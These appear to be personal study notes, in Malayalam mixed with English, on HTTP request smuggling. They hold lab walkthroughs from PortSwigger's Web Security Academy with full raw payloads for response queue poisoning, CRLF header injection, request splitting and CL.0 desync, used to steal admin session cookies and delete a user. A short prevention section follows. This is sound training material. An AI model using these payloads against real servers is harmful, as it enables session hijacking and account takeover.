                    POST / HTTP/2
					Host: 0a4400eb047edba9c0d4a8f3006600c7.web-security-academy.net
					Content-Length: 0
					
					SMUGGLEDGET /resources HTTP/1.1
					host: exploit-0a3800e70453dbbbc07ca89f018900a9.web-security- 
                    academy.net
 					content-lenth: 5
					
					x=1

==============================================================

#### #2 H2.TE vulnerabilities :
-->HTTP/2 il chunked transfer-encoding il angane nadakila.namal explicitly ittalum ath automatic aayi strip chyapedum allengil aa request angane thane block aakum
-->pakshe front-end server ith correct aayi impliment chythilengil back-end chunked encoding support chyum angane namuk smuggling attack chyan kazhinjekum

==============================================================

#### #3 Response queue poisoning :
-->Response queue poisoning is a powerful request smuggling attack that enables you to steal arbitrary responses intended for other users, potentially compromising their accounts and even the entire site
-->athayath back-end il ninum varuna response front-end wrong aaya request in kodukuna avastha.ath vazhi mattu users in kitenda response namuk kitunu
-->This is achieved by smuggling a complete request, thereby eliciting two responses from the back-end when the front-end server is only expecting one.
-->namal smuggle chyumbol rand request smuggle chyanam.apol front-end vijarikum ath oru request mathrame ayachitulu but back-end il kooduthal request vanitutund.so athinanusarich response aakivekum.ini front-end oru response namuk tharum but mate response back-endil thane kidakum.so ini vere oru user enthengilum request chyumbol ee response aayirikum aa user in kituka
-->ee attack HTTP/1.1 ilum HTTP/2 ilum namuk chyan patum
-->To make it easier to differentiate stolen responses from responses to your own requests, try using a non-existent path in both of the requests that you send. That way, your own requests should consistently receive a 404 response
-->athayath namal oru fake path vechal namukariyam enthayalum 404 kitum but matu user inte response aanengil response code vere aayirikum kituka.apol namuk peten namude response um mattullavarude response um manasilakan sadhikum

           Lab-12(Response queue poisoning via H2.TE request smuggling)
-->aadyam lab open chyuka enit athinte GET / repeater il iduka.
-->repeater il inspectoril poi http/2 aakuka.Repeater il(mukalil) poi mate ALPN tick iduka
-->GET ennath POST aakuka.enit enthengilum smuggle chyan patumon nokuka :

                        POST / HTTP/2
						Host: 0a7d00a7039eee2ec01e5a3500c600ed.web-security-academy.net
						Transfer-Encoding: chunked
						
						0
						
						SMUsdlfj
						
-->namuk 404 NOT FOUND kitunund.so smuggling nadakunund
-->ini namuk oru complete request smuggle chyam so aa request inum response backend tharum.enitaa reaponse queue chyam
-->==namal oru smuggled request teminate chyumbol rand empty line idanam ennale aa request complete aaku==
-->ini onukoodi chyanam.athayath namal ayakuna request inte response um matu users inte response um differentiate chyan fake path iduka randilum.apol namuk manasilkaum namude respones um matu oru user inte response um.namude aanengil epozhum 404 varum ok
-->final payload :

                POST /x HTTP/2
				Host: 0a7d00a7039eee2ec01e5a3500c600ed.web-security-academy.net
				Transfer-Encoding: chunked
				
				0
				
				GET /x HTTP/1.1
				Host: 0a7d00a7039eee2ec01e5a3500c600ed.web-security-academy.net
				

-->ini ith send chythondirikuka.apol ethengilum  oru user inte response kitum.ivide adminte response kitum apol 302 status code kanam
-->so adminte session cookie kitum ath copy chyuka.enit browser il cookie il change chyuka. angane namuk carlos ine delete chyam ok

==============================================================

### #4 Request smuggling via CRLF injection :
-->CRLF injection ennal namude `\r\n`  vech puthiya line aaki chyuna exploitation aan
-->chela samayam server `\r\n` varunath thadayum pakshe ottak `\n` varunath sanitize chyanamenil so namal ath nokanam
-->so ee `\n` oke itt namuk transfer-encoding polula prhitibitted headers(HTTP/2 il ith prohibited aan) use chyth test chyth nokam
-->eg : `Foo: bar\nTransfer-Encoding: chunked`
-->This discrepancy doesn't exist with the handling of a full CRLF (`\r\n`) sequence because all HTTP/1 servers agree that this terminates the header.athayath `\r\n`  itt test chyth nokenda karyamila karanam server ith ittal new line aayit thane aan kanunath so `\n`  ittayirikum athikam naaml test chyth nokuka
-->pakshe HTTP/2 inte karyam varumbol ath binary based format aan.so HTTP/1.1 pole oro headerum kazhiyumbol `\r\n`  ennum undakila.This means that `\r\n` no longer has any special significance within a header value and, therefore, can be included **inside** the value itself without causing the header to be split -> `foo`    `bar\r\nTransfer-Encoding: chunked`   .ith HTTP/2  aayathkond header name um value um vere aayitan undavuka athukondan ingane eg vechath
-->==This may seem relatively harmless on its own, but when this is rewritten as an HTTP/1 request, the `\r\n` will once again be interpreted as a header delimiter==. As a result, an HTTP/1 back-end server would see two distinct headers:
                          Foo: bar 
                          Transfer-Encoding: chunked
                          
                Lab-13(HTTP/2 request smuggling via CRLF injection)
-->Here the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
-->so aadyam lab open aakuka enit athil search bar kanam.athil enthengilum koduth search chyuka.apol result page il kanam namal type chythath reflect aakunund.athpole ath oru history pole save aayikidakunumund
-->so ee search chytha request eduth repeater il iduka.enit search=puthiyathenthengilum koduth send chyuka.apol repeater ile response il athum add aakunath kanam.
-->ini request ile cookie header angane thane remove chuyuka enit search=shajan enn koduth nokumbol response il kanam ath puthiyathayirikunu.athayath nerethe type chythathonum aa response page il illa.so athinartham session cookie il integrate chyapetirikukayan namal search chyuna karyangal
-->ini repeater ile inspectoril poi HTTP/2 aakuka.athpole mukalile Repeater il pi ALNP tick iduka. enit inpector il ulla Request Header click chythit namuk puthiya header aad chyam enit athil CRLF injection chythnokam ie, `foo` enn header name kodukuka.enit ee headerinte value aayi : 
                           `bar\r\n` 
                           `Transfer-Encoding: chunked`    enn koduth save chyuka.apol request side il HTTP/2 is kettled enn kanum.ath karyamakenda.ini body il :

                        0

                        smuggled
enn kodukuka.enit send chyuka.apol namuk kanam 404 NOT FOUND enn.so athinartham namude ee smuggling work aayi ennan.
-->ivide nadakunathenthenal aadyam namal oru fake header kodukunu.enit athil CRLF inject chyunu enitan transfer-encoding header cherkunath.athum ee foo enna fake header inte value il orumich.so front-end ith oru header inte value aayi kanum.but front-end back-end inod communicate chyumbol HTTP/1.1  ilek matum apol aan ee  `\r\n`  inte working nadakuka.apol request il ee foo um transfer-encodingum rand header aayi marum.so angane varumbol back-end ee 0 enn kanum enit smuggled ennath puthiya request aayi kanum
-->so ini namuk ee smuggled ennath maati ee search chyuna POST request smuggle chyam :

                    0

					POST / HTTP/1.1
					Host: YOUR-LAB-ID.web-security-academy.net
					Cookie: session=YOUR-SESSION-COOKIE
					Content-Length: 800       --1)
					
					search=x

-->ivide search=x ennuver aan smuggled request ullath.so ini next oru request varumbol aa request angane thane thil append aakum
-->kore pravisham send chythondirikanam.athikam 200,500 status aakum response il kanum. pakshe namuk vendath 404 NOT FOUND aan.ee reponse kitiyal nere browser il poi aa search page refresh chyuka(avide aanalo namal type chyunath history pole save aakunath).apol namuk kanam `[xGET / HTTP/1.1 Host: 0a2a0086032892....`   athayath matoru user inte request namude ee search=x il append aayirikunu.ini ee request il ulla session cookie eduth cookie extension il save chyth home page ilek poyal lab solve aakum
-->ithupolula exploit nadakumbol matoru user request chyunathinte thottmumbayi namude ee smuggling request back-endil ethanam.athuath 1) nok avide kanam 800 enn length.so bak-end correct 800 length in vendi wait chyum apol namal smuggle chyuna samayth vere requets onum aa time out aakunathin mumb vanilengil timeout error varum.so njan ivide kore pravisham chythitan matoru user inte request namude smuggled request il append aayath
-->404 kitumbol manasilakuka namude smuggled request back-endilek poitund but athin process chyan patunila.pakshe namal nere browser il poi refersh chythal append chyapeta request ee search result il history il save aayi kidaunath kanam.ok

==============================================================

### #5 HTTP/2 request splitting :
-->response queue il namal body il ulla request split chyunathan padichath.but when HTTP/2 downgrading is in play, you can also cause this split to occur in the headers instead.
-->HTTP/2 il  namuk header ilum requests split chyan patum
-->To split a request in the headers, you need to understand how the request is rewritten by the front-end server and account for this when adding any HTTP/1 headers manually. Otherwise, one of the requests may be missing mandatory headers.
-->For example, you need to ensure that both requests received by the back-end contain a `Host` header
-->downgrading chyuna samayath front-end :authority header replace chyth http/1.1 aakumbol host header ilek matum.smuggle chyumbol sradhikanam athyath GET / ittit pine host header idumbol aadyathe request inum host header aakunundon nokanam ilengil request send aakila

               Lab-14(HTTP/2 request splitting via CRLF injection)
-->the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.
-->ivide chyan pokunathenthenal request ile header inte idayil namal smuggle chyth request inte header il thane split undakunu
-->aadyam lab open chyuka enit GET /  request repeater il iduka.enit inspectoril poi HTTP/2 select chyuka.mukalile Repeater il poi ALPN tick chyuka
-->ini namude GET /   maati   GET /x  enn kodukuka apol namude request inte response um vere oru user inte response um peten manasilakam.namude request inte thane response aan varunathengil epozhum 404 varum vere oralude aanengil 302 varum.ivide admin te request kitumbol 302 aan varunath
-->so ini inspector il poi Request Header select chyth namuk puthiya header add chyam: adyam header name foo enn kodukuka enit athin enthengilum value kodukuka.enit aa same value il thane `\r\n` koduth namude vere headers itt test chyam

		name: foo

	     value:bar\r\n
				     \r\n
				     GET /x HTTP/1.1\r\n
				     Host: 0add002804b8500dc0d687bf00e900ec.web-security-academy.net

-->ipol request il kanam kettled enn.ath karyamakenda
-->ee request header add akiyathin shesham eni namude send button click chythondirikam.so avsanam namuk 302 Found enn kanam.ithil admin enonum response il kanila pakram aa response il session cookie kanam.so ath copy chyth cookie extension il poi save chyth refresh adikumbol namuk admin panel kanam.so ini carlos inte account delete chyam ok
-->ividem namal orutharam response queue poisoning aan chythath.athukondan namude response in pakarma vere oralude response kitunath.admin namude response um kitum

==============================================================

### #6 HTTP request tunnelling :
-->Many of the request smuggling attacks we've covered are only possible because the same connection between the front-end and back-end handles multiple requests
-->For example, some servers only allow requests originating from the same IP address or the same client to reuse the connection. Others won't reuse the connection at all, which limits what you can achieve through classic request smuggling as you have no obvious way to influence other users' traffic.
-->HTTP/2 request il oru fake header koduthit athinte valuee aayi 

                      foo  bar\r\n
								Content-Length: 200\r\n
								\r\n
								comment=
					x=1
kodukukmbol ee comment in shesham thazhe aayi vere headers oke undakumalo.so aa headers oke ee comment parameter inte value aayi varum.ivide ula x=1 ennath last body il varunathan allathe comment= in shesham varunathala ok
-->Responses to `HEAD` requests often contain a `content-length` header even though they don't have a body of their own. This normally refers to the length of the resource that would be returned by a `GET` request to the same endpoint.

==============================================================

==ee section il rand lab und (expert) ath chythitila pine nokam==

==============================================================

## Browser-powered request smuggling :
-->The request smuggling techniques you've learned so far rely on sending intentionally malformed requests using dedicated hacking tools like Burp Repeater. In fact, it's possible to perform the same attacks using fully browser-compatible requests that desync the two servers using a perfectly normal `Content-Length` header.
-->Here you'll learn how you can craft high-severity exploits without relying on malformed requests that browsers will never send. Not only does this expose a whole new range of websites to server-side request smuggling, it enables you to perform client-side variations of these attacks by inducing a victim's browser to poison its own connection to a vulnerable web server.

### #1 CL.0 request smuggling :
-->satharana namal content-length,transfer-encoding oke vechitulla reethiyil aan smuggling chyunath.but ivide namuk content-lenth oke zero aaki chyam
-->In some instances, servers can be persuaded to ignore the `Content-Length` header, meaning they assume that each request finishes at the end of the headers. This is effectively the same as treating the `Content-Length` as `0`.ithine CL.0 vulnerability enn parayunu
-->To probe for CL.0 vulnerabilities, first send a request containing another partial request in its body, then send a normal follow-up request. You can then check to see whether the response to the follow-up request was affected by the smuggled prefix.

                   Lab-15(CL.0 request smuggling)
-->ee lab chyanengil etavum latest burp venamen thonunu.njan latest community edition vech chythu
-->ivide puthiya version il repeater il namuk onnil kooduthal requestukale group aaki ore samayam send chyuna option und.so ath vechan namal chyunath
-->aadyam GET /   request eduth repeater il iduka.rand pravisham idanam.enit ath randum oru group aakuka(+ symbol kanam avide)
-->aadyathe request aan namal test chyunath.randamathe request aadyathe request kazhinjitula etavum next request aayi kanam
-->so aadyathe request GET mati POST aakuka.enit cookie,host ozhichu elam remove chyuka.enit  connection: keep-alive kodukuka.athin shesham body il oru request smuggle chyikuka.path oru arbitrary koduthal mathi.working aanengil enthayalum 404 kanikum
-->request nokiko :

                POST / HTTP/1.1
				Host: 0ae600dd03ac42eac0b52e5700d2006f.web-security-academy.net
				Cookie: session=Ntw54FMuX6chdFvw1aS2YkxE6AHqNYpe
				Connection: keep-alive
				Content-Type: application/x-www-form-urlencoded
				Content-Length: 50
				
				GET /404 HTTP/1.1
				Foo: x
-->NOTE: ee Foo: x  kazhinj next line idaruth ok
-->ini send button il poi downward button click chyth `send group (single connection)`  select chyuka
-->enit send chyuka.remember aadyathe request aan namal send chyunath.randamath ulla request il namal onum modify chythitila
-->send chyumbol namuk prathyekich onik kanila rand request intem response il 200 OK ennan kanuka.so namuk  POST /  ennath maati enthengilum static files (`POST /resources/labheader/images/logoAcademy.svg HTTP/1.1` - burp ile target option il poi directiory list il ninum resourse file eduth athil ninum eduthathan like css,js file polullath)itt onukoodi send chyth nokama
-->ipo send chythathin shesham aadyathe request il 200 OK  kanam.ini randamathe request ile response nokiyal kanam 404 NOT FOUND enn.so athinartham ee randamathe request namude smuggled requestinte koode aan vannath.so smuggled request backend ilek poi ennan athukond manasilakan sadhikuka
-->so namuk ipol smuggling chyan patunund so ini namuk ee GET /404 maati vere kodukam ie, GET /admin HTTP/1.1  enn koduth send chythit randamathe request il poi nokiyal kanam 200 OK enn.so aa response il kanam namuk admin panel access kitiyirikunu
-->so ini carlos account in avide nokiyal kanam delete chyanula link so ath copy chyth namuk ee GET /admin enn koduthidath paste chyuka enit send chyumbol carlos account delete aayi ok
-->final payload :

                    POST /resources/images/blog.svg HTTP/1.1
					Host: YOUR-LAB-ID.web-security-academy.net
					Cookie: session=YOUR-SESSION-COOKIE
					Connection: keep-alive
					Content-Length: CORRECT
					
					GET /admin/delete?username=carlos HTTP/1.1
					Foo: x
-->==REMEMBER== : 
     ->If the server responds to the second request as normal, this endpoint is not vulnerable
     ->If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the `Content-Length` of requests.

==============================================================

## Client-side desync :
-->Classic desync/request smuggling attacks rely on intentionally malformed requests that ordinary browsers simply won't send. This limits these attacks to websites that use a front-end/back-end architecture. However, as we've learned from looking at CL.0 attacks, it's possible to cause a desync using fully browser-compatible HTTP/1.1 requests
-->In high-level terms, a CSD attack involves the following stages:
1.  The victim visits a web page on an arbitrary domain containing malicious JavaScript.
    
2.  The JavaScript causes the victim's browser to issue a request to the vulnerable website. This contains an attacker-controlled request prefix in its body, much like a normal request smuggling attack.
    
3.  The malicious prefix is left on the server's TCP/TLS socket after it responds to the initial request, desyncing the connection with the browser.
    
4.  The JavaScript then triggers a follow-up request down the poisoned connection. This is appended to the malicious prefix, eliciting a harmful response from the server.

-->As these attacks don't rely on parsing discrepancies between two servers, this means that even single-server websites may be vulnerable.

-->Note : 
For these attacks to work, it's important to note that the target web server must not support HTTP/2. Client-side desyncs rely on HTTP/1.1 connection reuse, and browsers generally favor HTTP/2 where available.
-->One exception to this rule is if you suspect that your intended victim will access the site via a forward proxy that only supports HTTP/1.1.

### Testing for client-side desync vulnerabilities :
-->If the request just hangs or times out, this suggests that the server is waiting for the remaining bytes promised by the headers.
-->If you get an immediate response, you've potentially found a CSD vector. This warrants further investigation.

==ee section il rand lab und.expert aan.korach paadan so ath chyunila.ok==

==============================================================

# Pause-based desync :
-->Seemingly secure websites may contain hidden desync vulnerabilities that only reveal themselves if you pause mid-request.
-->Servers are commonly configured with a read timeout. If they don't receive any more data for a certain amount of time, they treat the request as complete and issue a response, regardless of how many bytes they were told to expect
-->Pause-based desync vulnerabilities can occur when a server times out a request but leaves the connection open for reuse. Given the right conditions, this behavior can provide an alternative vector for both server-side and client-side desync attacks.

### Server-side pause-based desync :
-->You can potentially use the pause-based technique to elicit CL.0 like behavior, allowing you to construct server-side request smuggling exploits for websites that may initially appear secure.
-->This is dependent on the following conditions:
      1. The front-end server must immediately forward each byte of the request to the back-end rather than waiting until it has received the full request.
      2. The front-end server must not (or can be encouraged not to) time out requests before the back-end server.
      3. he back-end server must leave the connection open for reuse following a read timeout.
-->ee exploit nadathan namal satharana pole request aakuka enit smuggle chyan ulla request aakuka.enit send chyuka.then :
       1.  The front-end forwards the headers to the back-end, then continues to wait for the remaining bytes promised by the `Content-Length` header.
       2.  After a while, the back-end times out and sends a response, even though it has only consumed part of the request. At this point, the front-end may or may not read in this response and forward it to us.
       3.  We finally send the body, which contains a basic request smuggling prefix in this case.
       4.  The front-end server treats this as a continuation of the initial request and forwards this to the back-end down the same connection.
       5.  The back-end server has already responded to the initial request, so assumes that these bytes are the start of another request.

### Testing for pause-based CL.0 vulnerabilities :
-->It's possible to test for pause-based CL.0 vulnerabilities using Burp Repeater, but only if the front-end server forwards the back-end's post-timeout response to you the moment it's generated, which isn't always the case
-->We recommend using the Turbo Intruder extension as it lets you pause mid-request then resume regardless of whether you've received a response.

==ee section ilum oru expert lab und but korach paadan so ath njan nokunila ok==


==============================================================

# Prevention :
-   Use HTTP/2 end to end and disable HTTP downgrading if possible. HTTP/2 uses a robust mechanism for determining the length of requests and, when used end to end, is inherently protected against request smuggling. If you can't avoid HTTP downgrading, make sure you validate the rewritten request against the HTTP/1.1 specification. For example, reject requests that contain newlines in the headers, colons in header names, and spaces in the request method.
    
-   Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP connection in the process.
    
-   Never assume that requests won't have a body. This is the fundamental cause of both CL.0 and client-side desync vulnerabilities.
    
-   Default to discarding the connection if server-level exceptions are triggered when handling requests.
    
-   If you route traffic through a forward proxy, ensure that upstream HTTP/2 is enabled if possible.


=======================================================

1) smuggle chyumbol first send button click chyumbol 200 ok verum pine onukudi click chyumbol 404 NOT FOUND kanikum
2) first click ilum second click ilum 200 OK then aanengil entho filtering nadakunund so namal T.E T.E aan test chyendath ie, lab 3 nok ok